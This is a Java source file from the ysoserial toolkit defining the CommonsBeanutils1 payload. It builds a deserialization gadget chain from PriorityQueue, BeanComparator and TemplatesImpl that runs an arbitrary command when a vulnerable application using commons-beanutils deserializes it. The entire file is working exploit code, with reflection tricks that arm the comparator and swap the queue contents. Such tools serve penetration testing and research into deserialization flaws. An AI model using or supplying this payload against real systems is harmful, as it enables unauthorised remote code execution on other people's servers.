package ysoserial.payloads;

import java.math.BigInteger;
import java.util.PriorityQueue;

import org.apache.commons.beanutils.BeanComparator;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

@SuppressWarnings({ "rawtypes", "unchecked" })
/*
 * Chain - by Xiaopan233
 *   PriorityQueue.readObject()
 *   PriorityQueue.heapify()
 *   PriorityQueue.siftDown()
 *   PriorityQueue.siftDownUsingComparator()
 *       BeanComparator.compare()
 *           PropertyUtils.getProperty()
 *           PropertyUtilsBean.getProperty()
 *               PropertyUtilsBean.getNestedProperty()
 *               PropertyUtilsBean.getSimpleProperty()
 *                   PropertyUtilsBean.invokeMethod()
 *                       TemplatesImpl.getOutputProperties()
 *                           TemplatesImpl.newInstance()
 *                           ......
 *
 * commons-beanutils 1.8.x - 1.9.x is ok
 * */
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
@Authors({ Authors.FROHOFF })
public class CommonsBeanutils1 implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
		final Object templates = Gadgets.createTemplatesImpl(command);
		// mock method name until armed
		final BeanComparator comparator = new BeanComparator("lowestSetBit");

		// create queue with numbers and basic comparator
		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
		// stub data for replacement later
		queue.add(new BigInteger("1"));
		queue.add(new BigInteger("1"));

		// switch method called by comparator
		Reflections.setFieldValue(comparator, "property", "outputProperties");

		// switch contents of queue
		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = templates;
		queueArray[1] = templates;

		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutils1.class, args);
	}
}
